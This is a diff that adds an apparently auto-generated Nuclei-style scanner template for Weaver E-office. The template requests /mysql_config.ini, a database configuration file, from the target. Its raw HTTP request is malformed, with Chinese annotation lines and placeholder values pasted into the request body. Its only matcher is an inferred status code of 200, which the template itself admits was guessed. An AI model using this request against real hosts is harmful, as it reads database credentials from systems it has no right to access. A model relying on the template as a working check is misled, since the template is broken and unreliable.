@@ -1,0 +1,36 @@
+id: poc-kd5sgsztry63124m
+info:
+  name: 泛微 E-office mysql_config.ini文件可直接访问
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kd5sgsztry63124m
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kd5sgsztry63124m
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /mysql_config.ini HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    dataname
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
